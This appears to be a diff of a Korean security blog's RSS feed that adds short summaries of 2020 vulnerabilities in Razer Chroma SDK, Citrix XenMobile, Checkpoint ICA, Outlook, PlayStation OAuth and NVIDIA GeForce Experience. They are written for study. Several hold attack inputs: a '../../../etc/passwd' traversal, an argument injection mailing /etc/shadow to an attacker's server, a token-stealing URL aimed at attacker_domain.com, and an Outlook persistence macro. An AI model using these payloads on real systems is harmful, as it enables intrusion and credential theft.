@@ -9,8 +9,210 @@
     <atom:link href="https://hackyboiz.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
     
     <description>hack &amp; life</description>
-    <pubDate>Sun, 22 Nov 2020 07:58:43 GMT</pubDate>
+    <pubDate>Sat, 28 Nov 2020 08:59:38 GMT</pubDate>
     <generator>http://hexo.io/</generator>
+    
+    <item>
+      <title>[하루한줄] CVE-2020-16602 : Remote File Execution on Razer Chroma SDK Server</title>
+      <link>https://hackyboiz.github.io/2020/11/28/fabu1ous/2020-11-28/</link>
+      <guid>https://hackyboiz.github.io/2020/11/28/fabu1ous/2020-11-28/</guid>
+      <pubDate>Sat, 28 Nov 2020 09:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.angelystor.com/2020/09/cve-2020-16602-remote-</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.angelystor.com/2020/09/cve-2020-16602-remote-file-execution-on.html">CVE-2020-16602</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Razer Chroma SDK Rest server &lt;= 3.12.17</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Razer Chroma는 Razer사의 게이밍용 컴퓨터 주변기기들의 RGB 효과를 제어하는 플러그인으로 Razer synapse 설치 시 자동으로 설치됩니다. SDK가 존재해서 third party가 Razer Chroma와 연동되는 기능을 만들 수 있습니다. </p><p>예 ) Razer 제품과 RGB효과를 동기화하는 케이스, 음악에 맞춰 Razer 제품의 RGB를 변화시키는 음악 스트리밍 서비스 </p><p>Razer Chroma SDK Rest server는 Razer Chroma를 사용하는 컴퓨터에서 동작하고 있으며 모든 네트워크 인터페이스와 bind 해 54236번 포트로 listen 합니다. <code>http://localhost:54235/razer/chromasdk</code> 혹은<code> https://chromasdk.io:54236/razer/chromasdk</code> URI로 App info를 담은 POST request를 받으면 그 App info에 따라 <code>C:\ProgramData\Razer Chroma SDK\Apps\</code>에 실행파일을 생성하고 실행합니다.</p><p>몇 가지 이슈로 인해 race-condition을 이용한 arbitrary code execution이 가능합니다.</p><ol><li><p>해커는 Razer Chroma SDK Rest server가 동작하는 컴퓨터(이하 victim)의 IP주소만 알면 원격으로 POST request를 보내 임의의 파일명을 갖는 실행파일을 victim에 생성할 수 있습니다.</p><pre><code class="hljs text">http://192.123.456.789:54235/razer/chromasdk -&gt; bad requestAddit hosts.txt on Attacker&#x27;s system---192.123.456.789 chromasdk.io---http://chromasdk.io:54235/razer/chromasdk -&gt; http://192.123.456.789:54235/razer/chromasdk</code></pre></li></ol><ol start="2"><li>POST request를 받아 <code>C:\ProgramData\Razer Chroma SDK\Apps\</code>에 생성한 실행파일은 Admin권한이 있는 유저만 수정할 수 있습니다. 하지만 <code>C:\ProgramData\Razer Chroma SDK\Apps\</code>폴더는 Admin 권한이 없어도 수정이 가능합니다.</li></ol><ol start="3"><li>POST request로 생성할 실행파일(test.exe)과 동일한 이름의 파일이 이미 <code>C:\ProgramData\Razer Chroma SDK\Apps\</code>폴더 안에 존재하면 Razer Chroma SDK Rest server는 기존 파일의 내용을 덮어씁니다. 하지만 그 실행파일의 권한은 그 파일이 실행되기 전까진 수정하지 않으므로, 해커는 race-condition으로 test.exe의 내용을 수정해  arbitrary code execution을 할 수 있습니다.</li></ol>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/razer/">razer</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/chroma/">chroma</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/race-condition/">race condition</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/toctou/">toctou</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2020/11/28/fabu1ous/2020-11-28/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>[하루한줄] CVE-2020-8209 : Path Traversal on Citrix XenMobile Server</title>
+      <link>https://hackyboiz.github.io/2020/11/27/l0ch/2020-11-27/</link>
+      <guid>https://hackyboiz.github.io/2020/11/27/l0ch/2020-11-27/</guid>
+      <pubDate>Fri, 27 Nov 2020 09:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://swarm.ptsecurity.com/path-traversal-on-citrix-xen</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://swarm.ptsecurity.com/path-traversal-on-citrix-xenmobile-server/">Path Traversal on Citrix XenMobile Server</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>XenMobile Server 10.12 before RP2<br>XenMobile Server 10.11 before RP4<br>XenMobile Server 10.10 before RP6<br>XenMobile Server before 10.9 RP5</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>조직 구성원들의 모바일 디바이스 및 애플리케이션을 관리하는 Endpoint Management 솔루션인 XenMobile에서 path traversal로 권한이 없는 사용자가 패스워드를 포함한 임의 파일을 읽을 수 있고, 암호화된 패스워드를 복호화 할 수 있는 취약점이 발견되었습니다.</p><p><code>help-sb-download.jsp</code> 에 존재하는 취약한 코드는 아래와 같습니다.</p><pre><code class="hljs jsx">&lt;%    <span class="hljs-built_in">String</span> sbFilePath=<span class="hljs-string">&quot;/opt/sas/support/&quot;</span>;    int length = <span class="hljs-number">0</span>;    <span class="hljs-built_in">String</span> sbFileName=(<span class="hljs-built_in">String</span>)request.getParameter(<span class="hljs-string">&quot;sbFileName&quot;</span>);    ServletOutputStream outStream = response.getOutputStream();    response.setHeader(<span class="hljs-string">&quot;Set-Cookie&quot;</span>,<span class="hljs-string">&quot;fileDownload=true; path=/&quot;</span>);    response.setContentType(<span class="hljs-string">&quot;application/octet-stream&quot;</span>);    response.setHeader(<span class="hljs-string">&quot;Content-Disposition&quot;</span>, <span class="hljs-string">&quot;attachment; filename=\&quot;&quot;</span> + sbFileName + <span class="hljs-string">&#x27;&quot;&#x27;</span>);    File file = <span class="hljs-keyword">new</span> File(sbFilePath+sbFileName);    byte[] byteBuffer = <span class="hljs-keyword">new</span> byte[<span class="hljs-number">4096</span>];    DataInputStream <span class="hljs-keyword">in</span> = <span class="hljs-keyword">new</span> DataInputStream(<span class="hljs-keyword">new</span> FileInputStream(file));    <span class="hljs-keyword">while</span>((<span class="hljs-keyword">in</span> != <span class="hljs-literal">null</span>) &amp;&amp; ((length =<span class="hljs-keyword">in</span>.read(byteBuffer)) != <span class="hljs-number">-1</span>))&#123;outStream.write(byteBuffer,<span class="hljs-number">0</span>,length);    &#125;    <span class="hljs-keyword">in</span>.close();    outStream.flush();%&gt;</code></pre><p>매개변수로 받는 <code>sbFileName</code>은 <code>sbFilePath</code>의 <code>/op/sas/support/</code> 뒤에 연결되고 File 클래스 생성자의 인수가 됩니다. <code>sbFileName</code>에 <code>../../../etc/passwd</code>를 전달하면 <code>/etc/passwd</code>의 내용을 출력할 수 있습니다.</p><p>이를 이용해 암호화된 패스워드의 복호화도 가능합니다. 패스워드 암호화는 <code>/opt/sas/sw/lib/libsecure.so</code> 와 <code>DataSecurity.jar</code> 라이브러리에서 이루어지며  <code>/opt/sas/rt/keys/security.properties</code>에는 암호화 키가 존재합니다. 해커가 path traversal 취약점을 악용해 라이브러리와 key를 다운로드하고 로컬 환경에서 암호화 라이브러리를 import 해 패스워드를 복호화할 수 있습니다.</p><p>이 취약점은 <code>help-sb-download.jsp</code> 파일을 제거하는 것으로 패치가 이루어졌습니다.</p>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/path-traversal/">path traversal</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/arbitrary-file-download/">arbitrary file download</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2020/11/27/l0ch/2020-11-27/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>[하루한줄] CVE-2020-6020: Checkpoint ICA Management Tool에서 발견된 취약점 2가지</title>
+      <link>https://hackyboiz.github.io/2020/11/26/idioth/2020-11-26/</link>
+      <guid>https://hackyboiz.github.io/2020/11/26/idioth/2020-11-26/</guid>
+      <pubDate>Thu, 26 Nov 2020 09:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://swarm.ptsecurity.com/vulnerabilities-in-checkpoin</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://swarm.ptsecurity.com/vulnerabilities-in-checkpoint-ica-management-tool/">Vulnerabilities in Checkpoint ICA Management Tool</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Checkpoint Security Manager - ICA Management Tool</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Checkpoint Security Management의 ICA(Internal Certificate Authority) Management Tool에서 Argument Injection과 Denial of Service 취약점이 발견되었습니다. ICA Management Tool은 기본적으로 비활성화되어있으며 <code>cpca_client set_mgmt_tool on &lt;your certification&gt;</code>로 활성화할 수 있으며 설정이 활성화되면 http://<smartcenter_ip>:18265/를 통해 접근할 수 있습니다. <code>cpca_client set_mgmt_tool on -no_ssl</code>을 통해 활성화할 시 인증 없이 해당 서비스에 접근이 가능하며 Manage Certificates에 접속했을 때 관리자인지 별도의 확인을 진행하지 않습니다.</p><p>ICA Management Tool에서 메일을 보내는 프로세스인 cpca는 sendmail 바이너리를 통하여 메일을 전송합니다. sendmail은 파일 전송 기능을 지원하지만 메일을 보낼 때 누가 보내는지 확인을 하지 않으며 최고 권한으로 실행되므로 모든 파일에 접근이 가능합니다. 따라서 인자로 파일 이름을 넘겨주면 해커의 메일 서버로 파일을 전송할 수 있습니다. </p><p>해커가 netcat 등을 통해 서버를 연 후 Configure the CA의 “Management Tool mail server”에 <code>&lt;hacker_ip&gt; -m /etc/shadow %0a%0a</code>를 입력하면 해커의 메일 서버에 <code>/etc/shadow</code> 파일 내용이 메일 형식으로 날아오게 됩니다.</p><p>Denial of Service의 경우 입력 값에 대한 유효성 검사 실패로 인해 발생합니다. 원격 클라이언트가 다음과 같은 형식으로 POST request를 보낼 경우 프로그램이 종료됩니다.</p><pre><code class="hljs pgsql">POST /file_init?_ HTTP/<span class="hljs-number">1.1</span>Host: <span class="hljs-keyword">checkpoint</span>.host:<span class="hljs-number">18265</span>Cookie: _Content-Length: <span class="hljs-number">1</span>q</code></pre>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/dos/">dos</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/argument-injection/">argument injection</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/checkpoint/">checkpoint</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2020/11/26/idioth/2020-11-26/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>[하루한줄] Outlook Mail based Persistence access</title>
+      <link>https://hackyboiz.github.io/2020/11/25/fabu1ous/2020-11-25/</link>
+      <guid>https://hackyboiz.github.io/2020/11/25/fabu1ous/2020-11-25/</guid>
+      <pubDate>Wed, 25 Nov 2020 09:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.mdsec.co.uk/2020/11/a-fresh-outlook-on-mail-b</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.mdsec.co.uk/2020/11/a-fresh-outlook-on-mail-based-persistence/">A Fresh Outlook on Mail Based Persistence</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows 10 Outlook</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Outlook은 Microsoft Office의 이메일 클라이언트로 일정 관리, 연락처 관리, 일지 등의 다양한 기능을 제공합니다. 그중 다른 Office 제품들과 마찬가지로 Outlook은 VBA(Visaul Basic for Application) 기반 매크로를 만들어 사용하는 기능이 있고, 해커는 이를 악용해 persistence access를 얻을 수 있습니다.</p><p>Persistence access란 해커가 victim에 initial access를 획득한 이후에도 지속적으로 access 할 수 있는 상태입니다. 특정 제목의 이메일이 도착하면 트리거 되는 악성 매크로를 victim에 심어놓으면 해커는 단순히 이메일을 보내는 것만으로 원격 제어할 수 있습니다.</p><pre><div class="caption"><span>basic</span></div><code class="hljs visual">Option ExplicitPrivate WithEvents olInboxItems As ItemsPrivate Sub Application_Startup()    Set olInboxItems &#x3D; Session.GetDefaultFolder(olFolderInbox).ItemsEnd SubPrivate Sub olInboxItems_ItemAdd(ByVal Item As Object)    On Error Resume Next    Dim olMailItem As MailItem    If TypeOf Item Is MailItem Then       If InStr(olMailItem.Subject, &quot;MDSec&quot;) &gt; 0 Then            MsgBox &quot;Hack The Planet&quot;            Shell &quot;calc.exe&quot;            olMailItem.Delete        End If    End If    Set Item &#x3D; Nothing    Set olMailItem &#x3D; NothingEnd Sub</code></pre><p>위 POC 코드는 calc.exe를 실행하는 VBA 매크로입니다. 우선 Outlook이 실행됐을 때의 수신 메일함 상태를 저장합니다. 이후에 새로운 이메일이 추가되면 그 이메일의 제목을 확인하고, 만약 그 제목이 “MDSec”이라면 calc.exe를 실행한 후 해당 이메일을 삭제합니다.</p><p>이메일의 제목뿐만 아니라 발신 주소 혹은 내용 등으로 매크로의 트리거 조건을 다양하게 설정할 수 있고, calc.exe 대신 리버스 쉘을 실행하면 해커가 원격 제어를 할 수 있게 됩니다. </p>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/outlook/">outlook</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/email/">email</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/persistence-access/">persistence access</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2020/11/25/fabu1ous/2020-11-25/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>[하루한줄] Access token stealing in playstation</title>
+      <link>https://hackyboiz.github.io/2020/11/24/l0ch/2020-11-24/</link>
+      <guid>https://hackyboiz.github.io/2020/11/24/l0ch/2020-11-24/</guid>
+      <pubDate>Tue, 24 Nov 2020 09:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://hackerone.com/reports/821896&quot;&gt;Access token steali</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://hackerone.com/reports/821896">Access token stealing in playstation</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p><a href="https://my.playstation.com/">https://my.playstation.com</a></p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>콘솔 게임기기인 PlayStation의 커뮤니티 <a href="https://my.playstation.com/auth/response.html%EC%97%90%EC%84%9C">https://my.playstation.com/auth/response.html에서</a> 로그인된 사용자의 Access Token을 탈취할 수 있는 취약점이 발견되었습니다.</p><p><a href="https://my.playstation.com/auth/response.html?requestID=iframe_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1&amp;baseUrl=/&amp;targetOrigin=https://my.playstation.com">https://my.playstation.com/auth/response.html?requestID=iframe_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1&amp;baseUrl=/&amp;targetOrigin=https://my.playstation.com</a> 페이지는 발급 서버에서 클라이언트로 OAuth 액세스 토큰을 전송하는 자바스크립트를 호스팅 합니다.</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parseResponse</span>(<span class="hljs-params">a</span>) </span>&#123;    <span class="hljs-keyword">var</span> b = a.hash.substr(<span class="hljs-number">1</span>),        c = a.search.substr(<span class="hljs-number">1</span>),        d = b + <span class="hljs-string">&quot;&amp;&quot;</span> + c,        e = convertToObject(d);    <span class="hljs-keyword">return</span> e.refererURL = a.toString(), e&#125;....<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sendResponseToApp</span>(<span class="hljs-params">a</span>) </span>&#123;    <span class="hljs-keyword">var</span> b = extractFrameTypeFromRequestID(a.requestID),        c = a.targetOrigin || getOrigin(),        d = a.baseUrl || <span class="hljs-string">&quot;&quot;</span>,        e = a.returnRoute || <span class="hljs-string">&quot;&quot;</span>,        f = a.excludeQueryParams,        g = !f &amp;&amp; <span class="hljs-built_in">window</span>.location.search || <span class="hljs-string">&quot;&quot;</span>;    <span class="hljs-keyword">switch</span> (b) &#123;...        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;window&quot;</span>:            <span class="hljs-built_in">window</span>.opener.postMessage(a, c);            <span class="hljs-keyword">break</span>;...    &#125;&#125;<span class="hljs-keyword">var</span> response = parseResponse(<span class="hljs-built_in">window</span>.location);sendResponseToApp(response);</code></pre><p>호스팅된 위 자바스크립트에서 아래 과정을 통해 access token을 해커의 서버로 전송할 수 있습니다.</p><ol><li>request query를 <code>parseResponse()</code> 함수에서 파싱 한 뒤  <code>sendResponseToApp()</code> 의 매개변수로 전달해 호출합니다.</li><li>query 중 <code>reqeustID</code> 필드 값이 “window” 면 <code>window.opener.postMessage()</code>를 호출합니다.</li><li><code>window.opener.postMessage()</code> 는 첫 번째 매개변수를 두 번째 매개변수인 특정 도메인으로 전달할 수 있습니다. 매개변수로 query와 <code>targetOrigin</code> 필드 값이 전달되면 <code>targetOrigin</code> 도메인으로 query에 포함되어 있는 Access Token을 전송할 수 있습니다.</li></ol><p>이를 이용한 최종 페이로드는 다음과 같습니다.</p><pre><code class="hljs jsx">https:<span class="hljs-comment">//my.playstation.com/auth/response.html?requestID=window_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1&amp;baseUrl=/&amp;targetOrigin=https://attacker_domain.com </span></code></pre><p>위 페이로드를 OAuth 발급 서버 request query의 <code>redirect_uri</code> 필드 값으로 보내면 Access Token을 탈취할 수 있습니다.</p><pre><code class="hljs jsx">https:<span class="hljs-comment">//auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?response_type=token&amp;scope=capone:report_submission,kamaji:game_list,kamaji:get_account_hash,user:account.get,user:account.profile.get,kamaji:social_get_graph,kamaji:ugc:distributor,user:account.identityMapper,kamaji:music_views,kamaji:activity_feed_get_feed_privacy,kamaji:activity_feed_get_news_feed,kamaji:activity_feed_submit_feed_story,kamaji:activity_feed_internal_feed_submit_story,kamaji:account_link_token_web,kamaji:ugc:distributor_web,kamaji:url_preview&amp;client_id=656ace0b-d627-47e6-915c-13b259cd06b2&amp;redirect_uri=https://my.playstation.com/auth/response.html?requestID=window_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1&amp;baseUrl=/&amp;targetOrigin=https://attacker_domain.com/&amp;prompt=non</span></code></pre>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/access-token-stealing/">access token stealing</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/playstation/">playstation</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/javascript/">javascript</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2020/11/24/l0ch/2020-11-24/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>[하루한줄] CVE-2020-5990: NVIDIA GeForce Experience Local Privilege Escalation</title>
+      <link>https://hackyboiz.github.io/2020/11/23/idioth/2020-11-23/</link>
+      <guid>https://hackyboiz.github.io/2020/11/23/idioth/2020-11-23/</guid>
+      <pubDate>Mon, 23 Nov 2020 09:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.trendmicro.com/en_us/research/20/k/cve-2020-1</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.trendmicro.com/en_us/research/20/k/cve-2020-17053-use-after-free-ie-vulnerability.html">CVE-2020-17053: Use-After-Free IE Vulnerability</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>NVIDIA GeForce Experience 3.20.5.70 이전 버전</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>NVDIA GeForce Experience의 GeForce 그래픽카드가 설치된 장비로 원격 게임을 지원하는 GAMESTREAM 기능에서 Local Privilege Escalation 취약점이 발견되었습니다.</p><p>nvcontainer.exe 프로세스는 user impersonation 없이 <code>C:\\ProgramData\\NVIDIA Corporation\\ShadowPlay\\</code> 디렉터리에 <code>CaptureCore.log</code> 파일을 쓰거나 생성합니다. 이때 상위 폴더 상속으로 인해 모든 사용자는 해당 파일과 파일이 있는 폴더에 모든 권한을 갖습니다. 하지만 <code>CaptureCore.log</code> 파일을 삭제한 후 GAMESTREAM을 재시작하면 <code>nvspapi64.dll</code>에서 소프트 링크와 하드 링크에 대한 검사를 진행하여 심볼릭 링크 파일을 삭제합니다. 이 작업은 <code>nvspapi64.dll</code>에서 수행되는데 검사를 진행한 후 <code>CaptureCore.log</code>에 대한 핸들을 닫고 최종 경로를 가져와 작업을 수행하기 위해 다시 핸들을 엽니다.</p><p><img src="/2020/11/23/idioth/2020-11-23/image.png"></p><p>이를 활용하여 특정 파일에 대한 access event를 catch 하는 <a href="https://docs.microsoft.com/en-us/windows/win32/fileio/opportunistic-locks">OpLock</a>을 CaptureCore.log에 설정한 후 검사를 진행하면 OpLock이 트리거 되어 C:\Windows\System32 폴더에 arbitrary file creation이 가능합니다.</p>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/race-condition/">race condition</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/toctou/">toctou</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/lpe/">lpe</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/geforce-experience/">geforce experience</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2020/11/23/idioth/2020-11-23/#disqus_thread</comments>
+      
+    </item>
     
     <item>
       <title>[Translation] Engineering Antivirus evasion Part.1</title>
@@ -201,6 +403,8 @@
       <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
       
       
+      <category domain="https://hackyboiz.github.io/tags/toctou/">toctou</category>
+      
       <category domain="https://hackyboiz.github.io/tags/samsung/">samsung</category>
       
       <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
@@ -212,8 +416,6 @@
       <category domain="https://hackyboiz.github.io/tags/heap-buffer-overflow/">heap buffer overflow</category>
       
       <category domain="https://hackyboiz.github.io/tags/exynos/">exynos</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/toctou/">toctou</category>
       
       <category domain="https://hackyboiz.github.io/tags/shared-memory/">shared memory</category>
       
@@ -508,210 +710,6 @@
       
       
       <comments>https://hackyboiz.github.io/2020/11/09/idioth/2020-11-09/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>[하루한줄] Detecting Dynamic Loading in Android App</title>
-      <link>https://hackyboiz.github.io/2020/11/08/fabu1ous/2020-11-08/</link>
-      <guid>https://hackyboiz.github.io/2020/11/08/fabu1ous/2020-11-08/</guid>
-      <pubDate>Sun, 08 Nov 2020 09:00:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://sayfer.io/blog/dynamic-loading-in-android-applica</description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://sayfer.io/blog/dynamic-loading-in-android-applications-with-proc-maps/">Detecting Dynamic Loading in Android Applications With /proc/maps</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Android 10 API 29 이상 버전</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Android application은 dynamic loading을 통해 run-time 도중 어느 시점에라도 코드를 메모리에 로드할 수 있습니다. API level 29부턴 이 dynamic loading을 악용해 apk의 정적 검사를 피해 가는 악성코드들을 막기 위해 apk에 속하지 않은 코드의 load를 막고 있습니다. 하지만 여전히 DexClassLoader에 의한 .dex 파일의 dynamic loading이 가능해 여전히 악용에 사용될 수 있습니다.</p><p>모든 프로세스는 각각 <code>/proc/[PID]</code>라는 디렉터리를 갖고, 그중 <code>/proc/[PID]/maps</code>라는 파일은 프로세스의 매핑된 메모리가 기록돼있습니다.  따라서 프로세스가 어떠한 파일에 접근하면 <code>/proc/[PID]/maps</code>에 기록이 남습니다. 이 기록을 통해 프로세스가 <code>/data/data</code> 디렉터리 속 .dex 접근 여부를 검사해 dynamic loading을 탐지할 수 있습니다. </p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://developer.android.com/reference/dalvik/system/DexClassLoader">https://developer.android.com/reference/dalvik/system/DexClassLoader</a></p><p><a href="https://developer.android.com/about/versions/10/behavior-changes-10">https://developer.android.com/about/versions/10/behavior-changes-10</a></p>]]></content:encoded>
-      
-      
-      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
-      
-      
-      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/android/">android</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/dynamic-loading/">dynamic loading</category>
-      
-      
-      <comments>https://hackyboiz.github.io/2020/11/08/fabu1ous/2020-11-08/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>[Research] gdb-frontend 포너블에 적합한가?</title>
-      <link>https://hackyboiz.github.io/2020/11/08/fabu1ous/gdb-frontend-review/</link>
-      <guid>https://hackyboiz.github.io/2020/11/08/fabu1ous/gdb-frontend-review/</guid>
-      <pubDate>Sun, 08 Nov 2020 06:00:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;h1 id=&quot;5개월-묵힌-링크&quot;&gt;&lt;a href=&quot;#5개월-묵힌-링크&quot; class=&quot;headerlink&quot; title=&quot;5개월 묵힌 링크&quot;&gt;&lt;/a&gt;5개월 묵힌 링크&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;/2020/11/08/fabu1ous/gdb-fronten</description>
-        
-      
-      
-      
